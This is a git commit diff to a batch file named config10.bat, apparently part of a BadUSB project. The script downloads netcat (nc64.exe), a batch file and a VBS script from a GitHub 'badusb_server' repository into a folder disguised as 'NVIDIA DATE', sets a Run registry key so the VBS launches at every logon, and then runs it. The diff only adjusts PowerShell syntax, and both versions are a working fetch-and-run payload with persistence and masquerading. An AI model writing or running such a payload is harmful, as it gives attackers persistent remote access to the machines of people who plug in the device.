2dfb11b612acf7dd9aff70076f41c278fcbc18c4
KBT096 <45223710+KBT096@users.noreply.github.com>
2019-08-25 17:39:02 +0800

    Update config10.bat

--- config10.bat
+++ config10.bat
@@ -1,7 +1,7 @@
 powershell
-powershell(Invoke-WebRequest -uri 'https://raw.githubusercontent.com/KBT096/badusb_server/master/nc.bat' -OutFile "'C:\ProgramData\NVIDIA DATE\nc.bat'")
-powershell(Invoke-WebRequest -uri 'https://raw.githubusercontent.com/KBT096/badusb_server/master/shut.vbs' -OutFile "'C:\ProgramData\NVIDIA DATE\shut.vbs'")
-powershell(Invoke-WebRequest -uri 'https://raw.githubusercontent.com/KBT096/badusb_server/master/nc64.exe' -OutFile "'C:\ProgramData\NVIDIA DATE\nc64.exe'")
+Invoke-WebRequest -uri 'https://raw.githubusercontent.com/KBT096/badusb_server/master/nc.bat' -OutFile "C:\ProgramData\NVIDIA DATE\nc.bat"
+Invoke-WebRequest -uri 'https://raw.githubusercontent.com/KBT096/badusb_server/master/shut.vbs' -OutFile "C:\ProgramData\NVIDIA DATE\shut.vbs"
+Invoke-WebRequest -uri 'https://raw.githubusercontent.com/KBT096/badusb_server/master/nc64.exe' -OutFile "C:\ProgramData\NVIDIA DATE\nc64.exe"
 reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "shut"  /t REG_SZ /d "c:\ProgramData\NVIDIA DATE\shut.vbs" /f
 "c:\ProgramData\NVIDIA DATE\shut.vbs"
 exit
